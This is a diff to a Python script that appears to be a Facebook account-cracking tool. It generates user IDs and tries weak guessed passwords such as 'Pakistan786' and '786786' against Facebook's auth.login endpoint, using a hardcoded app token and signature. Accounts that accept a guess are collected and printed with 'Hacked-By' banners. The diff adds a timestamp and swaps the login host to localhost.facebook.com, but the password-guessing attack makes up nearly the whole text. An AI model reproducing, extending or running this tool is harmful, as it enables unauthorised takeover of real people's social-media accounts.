@@ -255,7 +255,9 @@ def action():
         action()
     print 50* '\033[1;94m-'
     xxxxx = str(len(id))
-  
+    now=datetime.datetime.now()
+    print("Current Date And TIME IS:")
+    print(now.strftime("%y-%m-%d, %H:%M:%S"))
    
     jalan ('\033[1;96m Total Number of IDs: '+xxxxx)
     jalan ('\033[1;95mCode you choosed: '+c)
@@ -272,7 +274,7 @@ def action():
             pass
         try:
             pass1 = user 
-            data = br.open('https://graph.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open('https://localhost.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print(' Hacked-By-Pathan |   User-ID    |   + password'+username)
@@ -291,7 +293,7 @@ def action():
                     cpb.append(c+user+pass1)
                 else:
                     pass2 = k + c + user
-                    data = br.open('https://graph.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    data = br.open('https://localhost.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
                         print(' Hacked-By-Pathan  |   User-ID    |   + password'+username)   
@@ -310,7 +312,7 @@ def action():
                             cpb.append(c+user+pass2)
                         else:
                             pass3="Pakistan"
-                            data = br.open('https://graph.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            data = br.open('https://localhost.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
                                 print(' Hacked-By-Jani |   User-ID    |   + password'+username)
@@ -329,7 +331,7 @@ def action():
                                     cpb.append(c+user+pass3)
                                 else:
                                     pass4="786786"
-                                    data = br.open('https://graph.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    data = br.open('https://localhost.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
                                         print(' Hacked-By-Jani  |   User-ID    |   + password'+username)
@@ -348,7 +350,7 @@ def action():
                                             cpb.append(c+user+pass4)
                                         else:
                                             pass6="Pakistan786"
-                                            data = br.open('https://graph.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            data = br.open('https://localhost.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
                                                 print(' Hacked-By-Jani  |   User-ID    |   + password'+username)
@@ -398,7 +400,7 @@ def action():
 
 
 \033[1;96mThanks me later
-\033[1;95mFb\033[1;97mhttps://w ww.facebook.com/RequestTimeOut408"""
+\033[1;95mFb\033[1;97mhttps://www.facebook.com/RequestTimeOut408"""
 
     
     raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
